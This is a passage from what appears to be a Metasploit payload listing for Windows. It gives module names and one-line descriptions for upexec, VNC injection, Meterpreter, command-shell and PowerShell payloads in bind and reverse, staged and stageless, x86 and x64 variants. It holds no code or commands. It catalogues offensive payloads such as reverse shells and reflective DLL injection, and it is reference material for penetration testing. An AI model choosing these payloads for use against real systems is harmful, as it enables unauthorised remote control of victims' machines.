    windows/upexec/reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)
    windows/upexec/reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/upexec/reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support
    windows/upexec/reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support
    windows/vncinject/bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/vncinject/bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/vncinject/bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)
    windows/vncinject/bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/vncinject/bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)
    windows/vncinject/bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)
    windows/vncinject/bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)
    windows/vncinject/bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection
    windows/vncinject/bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)
    windows/vncinject/find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection
    windows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/vncinject/reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)
    windows/vncinject/reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP
    windows/vncinject/reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6
    windows/vncinject/reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)
    windows/vncinject/reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/vncinject/reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support
    windows/vncinject/reverse_udp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support
    windows/vncinject/reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)
    windows/x64/exec                                    Execute an arbitrary command (Windows x64)
    windows/x64/loadlibrary                             Load an arbitrary x64 library path
    windows/x64/messagebox                              Spawn a dialog via MessageBox using a customizable title, text & icon
    windows/x64/meterpreter/bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection (Windows x64)
    windows/x64/meterpreter/bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection with UUID Support (Windows x64)
    windows/x64/meterpreter/bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a pipe connection (Windows x64)
    windows/x64/meterpreter/bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection (Windows x64)
    windows/x64/meterpreter/bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection with UUID Support (Windows x64)
    windows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/meterpreter/reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/meterpreter/reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker via a named pipe pivot
    windows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker (Windows x64)
    windows/x64/meterpreter/reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker
    windows/x64/meterpreter/reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker with UUID Support (Windows x64)
    windows/x64/meterpreter/reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 winhttp)
    windows/x64/meterpreter/reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTPS (Windows x64 winhttp)
    windows/x64/meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell
    windows/x64/meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell
    windows/x64/powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session
    windows/x64/powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session
    windows/x64/shell/bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)
    windows/x64/shell/bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)
    windows/x64/shell/bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)
    windows/x64/shell/bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)
    windows/x64/shell/bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)
    windows/x64/shell/reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
    windows/x64/shell/reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker
    windows/x64/shell/reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
    windows/x64/shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)
    windows/x64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)
    windows/x64/vncinject/bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)
    windows/x64/vncinject/bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)
    windows/x64/vncinject/bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)
    windows/x64/vncinject/bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)
    windows/x64/vncinject/bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)
    windows/x64/vncinject/reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/vncinject/reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/vncinject/reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)
    windows/x64/vncinject/reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker
    windows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
    windows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)
    windows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)
```
